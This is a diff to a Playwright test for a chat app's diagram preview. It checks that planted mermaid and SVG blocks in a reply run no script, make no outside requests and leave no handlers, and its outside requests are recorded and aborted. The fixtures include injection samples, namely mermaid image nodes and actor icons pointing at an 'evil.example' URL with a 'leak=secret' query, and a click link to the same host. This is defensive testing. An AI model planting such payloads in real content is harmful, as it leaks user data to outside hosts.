@@ -42,12 +42,15 @@ async function reply(page: Page, text: string) {
   await chat(page, c => { c.send({ type: 'text-end', id: 't1' }); c.finish() })
 }
 
-/** Every request the page makes that is not the preview server itself. */
-function outsideRequests(page: Page): string[] {
+/**
+ * Every request that would leave for anywhere but the preview server (kept from the network and recorded). A load a
+ * CSP refuses never gets here: it is stopped in the page, as the diagram frame's own policy does.
+ */
+async function outsideRequests(page: Page): Promise<string[]> {
   const seen: string[] = []
-  page.on('request', request => {
-    const url = new URL(request.url())
-    if (!['data:', 'blob:', 'about:'].includes(url.protocol) && url.hostname !== '127.0.0.1') seen.push(request.url())
+  await page.route(url => !['data:', 'blob:', 'about:'].includes(url.protocol) && url.hostname !== '127.0.0.1', route => {
+    seen.push(route.request().url())
+    return route.abort()
   })
   return seen
 }
@@ -96,8 +99,7 @@ test('a reply\'s mermaid and SVG blocks are drawn as pictures, and mermaid\'s fi
 })
 
 test('a planted diagram runs nothing and reaches nothing: no script, handler, outside reference or loose mermaid', async ({ page }) => {
-  const outside = outsideRequests(page)
-  await page.route(url => url.hostname !== '127.0.0.1', route => route.abort())
+  const outside = await outsideRequests(page)
   const state = await openPreview(page, 'chat-header', { turn: 'manual' })
   await page.evaluate(() => { (window as unknown as PageGlobals).__pwned = [] })
   const evilSvg = [
@@ -125,9 +127,15 @@ test('a planted diagram runs nothing and reaches nothing: no script, handler, ou
     '  click B href "https://evil.example/link"',
     '```',
   ].join('\n')
+  // mermaid's own loaders (review of this change): a node's image (`new Image()` while it measures) and a sequence
+  // actor's icon (an <image> in the live document) — both before anything is sanitised.
+  const evilImageNode = '```mermaid\nflowchart LR\n  A@{ img: "https://evil.example/node.png?leak=secret", label: "画像", pos: "t", w: 60, h: 60 } --> B[次]\n```'
+  const evilActorIcon = '```mermaid\nsequenceDiagram\n  participant A\n  participant B\n  properties A: {"class": "x", "icon": "https://evil.example/actor.png"}\n  A->>B: こんにちは\n```'
   await send(page, '図を出して')
-  await reply(page, `一つ目：\n\n${evilSvg}\n\n二つ目：\n\n${evilMermaid}\n\n以上。`)
-  await expect(diagrams(page)).toHaveCount(2, { timeout: 20_000 })
+  await reply(page, `一つ目：\n\n${evilSvg}\n\n二つ目：\n\n${evilMermaid}\n\n三つ目：\n\n${evilImageNode}\n\n四つ目：\n\n${evilActorIcon}\n\n以上。`)
+  await expect(diagrams(page).first()).toBeVisible({ timeout: 20_000 })
+  await expect(page.getByText('図を描いています…')).toHaveCount(0, { timeout: 20_000 })
+  expect(await diagrams(page).count()).toBeGreaterThanOrEqual(2)
   // Pressing a picture does nothing either.
   for (const image of await diagrams(page).all()) await image.click()
   await page.waitForTimeout(500)
@@ -152,7 +160,7 @@ test('a planted diagram runs nothing and reaches nothing: no script, handler, ou
     }
     return found
   }))
-  expect(planted, 'no element, handler or outside reference survives').toEqual([[], []])
+  expect(planted.flat(), 'no element, handler or outside reference survives').toEqual([])
   // What survives is still a picture: the words drawn, the planted parts gone.
   const [svg, mermaid] = await decodedPictures(page)
   expect(svg.src).toContain('見出し')
